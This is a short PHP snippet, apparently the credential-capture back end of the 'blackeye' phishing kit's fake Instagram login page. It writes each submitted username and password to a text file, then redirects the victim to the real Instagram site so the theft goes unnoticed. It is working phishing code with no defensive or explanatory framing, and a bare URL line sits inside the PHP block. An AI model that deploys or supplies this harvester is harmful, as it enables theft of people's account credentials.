<?php
https://github.com/thelinuxchoice/blackeye/blob/dfcd5976ca11a19687791c44db794339c4bfa072/sites/instagram/login.html#L7
file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
